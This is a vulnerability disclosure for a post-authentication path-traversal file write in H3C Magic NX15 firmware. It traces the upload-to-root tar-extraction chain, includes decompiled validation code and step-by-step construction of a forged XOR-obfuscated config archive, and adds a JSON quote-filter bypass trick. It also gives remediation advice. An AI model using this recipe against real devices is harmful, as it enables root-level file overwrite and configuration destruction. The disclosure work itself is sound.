# Post-auth Arbitrary File Write via `esps.system.importprofile`

- **Vendor / Product**: H3C / Magic NX15
- **Affected version**: `NX15V100R017` (internal `NX15V100D025`)
- **Vulnerability type**: External Control of File Name or Path (CWE-73),
  Path Traversal (CWE-22)
- **Privilege required**: authenticated administrator
- **Impact**: arbitrary file create/overwrite as **root**; persistent
  configuration destruction
- **CVSS 3.1**: `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2**

---

## 1. Entry point and chain

```text
POST /api/upload?type=cfg&chkSum=<md5>&fileSize=<n>&fileName=NX15.cfg
  (requires AUTHENTICATION)
  -> FCGI_UploadProcess   type=cfg branch: file name must contain '.' and end in ".cfg"
  -> FCGI_SaveFile(a4 = 3): header validation SKIPPED, writes /tmp/NX15.cfg
  -> FCGI_UbusPassThrough1("esps.system", "importprofile", {"chkSum","path"})
  -> esps.system / importprofile:
        is_valid_cfg():
            cd /tmp/
            file_encrypt NX15.cfg NX15_org.tar.gz         # XOR 0x55
            tar -xzvf NX15_org.tar.gz                     # -> NX15.tar.gz, NX15.info
            validate NX15.info == "<product><version>R<revision> <md5(NX15.tar.gz)>"
        rm -rvf /mnt/config/*
        cd / && tar -xzvf /tmp/NX15.tar.gz                <- ROOT, cwd=/
```

The archive is extracted with `cwd=/`, so **member names are taken as absolute
paths relative to the root**. There is no allow-list, no `../` filtering and no
signature check. `FCGI_SaveFile` opens the upload with `fopen(a1, "wb")` **before**
the header check, so even a rejected upload can create or truncate a file.

## 2. What the "encryption" actually is

`/usr/bin/file_encrypt` reduces to a single-byte XOR with `0x55`, which is its
own inverse:

```c
v53 = fread(v48, 1, 1024, v21);
for ( i = (char *)v48; (char *)(v48 + v53) != i; *(i - 1) = v55 ^ 0x55 )
    v55 = *i++;
fwrite(v48, 1, v53, v34);
```

The validation performed by `is_valid_cfg()`:

```sh
hdrInfo=$(dd if="${path}" bs=1 count=64)      # only the first 64 bytes are read
...
file_encrypt "${path}" "${hostName}"_org.tar.gz
tar -xzvf "${hostName}"_org.tar.gz
cfgInfo=$(cat "${hostName}".info)
verInfoCfg=$(echo $cfgInfo | awk '{print $1}')   # e.g. NX15V100R017
md5InfoCfg=$(echo $cfgInfo | awk '{print $2}')
if [ "${productName}" != "${productNameCfg}" ] \
   || [ "${verV}" != "${verVCfg}" ] \
   || [ ${verRCfg} -gt ${verR} ] \
   || [ "${md5InfoCfg}" != "${md5Cacl}" ]; then
    return 1
fi
```

Since the attacker supplies both the archive and its MD5, every condition is
attacker-controlled. The comparison is `verRCfg -gt verR`, i.e. the supplied
revision must be **less than or equal to** the running one; `017` satisfies it.

## 3. Crafting the payload

```text
1) www/download/flag.txt            (the file to plant)
2) tar -czf NX15.tar.gz www/download/flag.txt        # relative path -> lands under /
3) printf 'NX15V100R017 %s\n' "$(md5sum NX15.tar.gz | cut -d' ' -f1)" > NX15.info
4) tar -czf NX15_org.tar.gz NX15.tar.gz NX15.info
5) XOR every byte with 0x55        -> NX15.cfg
6) upload as type=cfg with chkSum = md5(NX15.cfg), fileSize = size(NX15.cfg)
```

## 4. Observed result

```text
[*] NX15.cfg  369 bytes  md5=7440e152689618b435dd90a331d447f4
{"code": 5,"message":"COMMON:Internal error"}
[*] GET /download/flag.txt:
XGCTF{}
```

```text
GET http://<target>/download/flag.txt
HTTP/1.1 200 OK
Content-Length: 8
XGCTF{}
```

`{"code":5}` comes from the trailing
`uci -c /mnt/config set system.system.uci_default_state="1"`; by that point the
method has already run `rm -rvf /mnt/config/*`, so the directory is gone and the
`uci` call fails. It does **not** prevent the extraction, which happens first.

The same primitive was used during analysis to **restore** an accidentally
overwritten `/usr/lib/lua/protol_cvt.lua`; after restoration the file was
byte-identical to the firmware image (`sha256 c4ffce47…`), confirming that the
primitive overwrites existing files on the read-only-by-image root filesystem
(the root is an overlay; only `/rom` is truly read-only).

> **`/api/esps` filter note.** Writing UCI-style content through the companion
> `file.write` method requires encoding the single quote as `\u0027`, because
> `FCGI_CheckStringIfContainsSemicolon_Esps` inspects raw bytes for `0x27` while
> JSON decoding happens later in the Lua layer. When building such a request,
> substitute an all-ASCII sentinel first and replace it with `\u0027` **after**
> `json.dumps`; using a control character as the sentinel fails because
> `json.dumps` escapes it to `\u0000`.

## 5. Normal behaviour — the `/mnt/config` wipe

`lib/preinit/79_mount_h3c` establishes a two-level configuration scheme:

```sh
mount -n -t jffs2 /dev/mtdblock${block} -o rw,noatime /mnt/config   # persistent layer
if [ ! -f "$CONFIG_DIR_OVERLAY/..." ]; then
    cp -rf /rom/etc/config/* /mnt/config      # first boot: seed from factory
fi
cp -rf /mnt/config/* /etc/config              # every boot: persistent -> live
```

This wipe is the feature's own normal behaviour — it runs on every import,
legitimate or not — so it is a hazard to note when testing rather than an
attacker capability. `rm -rvf /mnt/config/*` destroys the **persistent** layer
while `/etc/config` (and therefore current operation) stays intact — until the
next reboot, when the device falls back to factory values.

Whether the device also reboots into the wizard state depends on whether the
marker write succeeds:

| `/mnt/config` state before the call | `uci -c /mnt/config set … commit` | Outcome |
|---|---|---|
| partially populated | succeeds | `uci_default_state=1` persisted -> **next reboot enters factory/wizard state** (`factoryMode:1`), `/api/wizard/config` reachable unauthenticated |
| already emptied by the `rm` | fails | no marker -> `factoryMode` stays `0`; response is `{"code":5}` |

Both cases were observed on the same device.

## 6. Remediation

- Extract archives into a dedicated directory and validate every member name
  (reject absolute paths and `..` components).
- Do not rely on an attacker-supplied checksum for integrity; require a
  signature over the archive.
- The `XOR 0x55` obfuscation provides no confidentiality or integrity and should
  not be described as encryption.
- Do not `rm -rf` the persistent configuration directory before the new
  configuration has been validated and staged.

## 7. References

- Firmware download portal:
  <https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/>
- Companion reports for the same firmware: see the sibling
  directories of this one (each contains its own report and PoC).
